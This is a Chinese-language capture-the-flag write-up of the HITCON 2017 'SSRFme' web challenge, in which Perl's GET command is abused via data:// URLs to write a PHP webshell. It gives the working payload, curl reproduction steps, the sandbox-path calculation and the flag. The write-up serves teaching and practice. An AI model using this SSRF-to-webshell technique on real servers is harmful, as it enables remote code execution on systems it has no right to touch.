---
title: "[HITCON 2017]SSRFme"
platform: BUUCTF
category: Web
difficulty: 中等
tags: [ssrf, perl-get, data-protocol, file-write]
vulnerability: Perl GET 命令支持 data:// 协议，可写入任意内容到服务器文件
solved: true
flag: "flag{187bba6b-bd64-47d9-a3ba-5f40667324ee}"
---

# [HITCON 2017]SSRFme

## 题目概述
题目提供了一个 PHP 页面，使用 Perl 的 `GET` 命令获取 URL 内容并写入文件。核心代码：
```php
$data = shell_exec("GET " . escapeshellarg($_GET["url"]));
// ... 将 $data 写入 $_GET["filename"] 指定的文件
```

## 信息收集
1. 访问页面获取源码
2. 发现使用 `shell_exec("GET ...")` 执行 Perl 的 GET 命令
3. 通过 `file:///` 协议列出根目录，发现 `/flag` 和 `/readflag` 文件
4. `/flag` 文件无法直接读取（权限限制），需要执行 `/readflag`

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**: SSRF + 文件写入 → RCE

**原理**:
- Perl 的 `GET` 命令（来自 LWP::Simple）支持多种协议：`http://`, `file://`, `data://` 等
- `data://` 协议允许直接返回任意数据内容
- 结合文件写入功能，可写入 PHP 代码文件并执行

**判断过程**:
1. `escapeshellarg` 防止命令注入，但无法阻止协议滥用
2. 测试 `file:///` 成功列出目录 → GET 命令支持 file 协议
3. 测试 `data://` 协议 → 成功写入自定义内容

## 利用过程（Payload + Flag）

**Payload**: 利用 data 协议写入 PHP webshell
```
?url=data:text/plain,%3C%3Fphp%20system('/readflag');%3F%3E&filename=shell.php
```

**步骤**:
1. 发送请求写入 `shell.php`，内容为 `<?php system('/readflag');?>`
2. 访问 `/sandbox/[hash]/shell.php` 执行 PHP 代码
3. 获取 flag: `flag{187bba6b-bd64-47d9-a3ba-5f40667324ee}`

**沙箱路径计算**:
```bash
echo -n "orange192.168.122.15" | md5sum
# 结果: 50d5f583d8a911dde39156ba3f03c3d5
```

## 复现步骤
```bash
# 1. 写入 PHP 文件
curl "http://target/?url=data:text/plain,%3C%3Fphp%20system('/readflag');%3F%3E&filename=shell.php"

# 2. 访问写入的 PHP 文件获取 flag
curl "http://target/sandbox/[md5_hash]/shell.php"
```

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）
| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| SSRF | GET 命令协议滥用 | `data:text/plain,<?php system...` | Perl GET 支持多种协议 |
| 文件写入 | filename 参数 | 写入 PHP 文件 | data:// 协议返回自定义内容 |

## 知识总结（解题技巧、同类题型套路）
1. **Perl GET 命令特性**: 支持 `http://`, `file://`, `data://`, `ftp://` 等协议
2. **data:// 协议**: 格式 `data:[mediatype][;base64],data`，可直接返回任意内容
3. **SSRF + 文件写入组合**: 当 SSRF 结果可写入文件时，可尝试写入可执行代码
4. **同类题型套路**: 检查 SSRF 工具支持的协议，寻找写入 + 执行的组合利用链
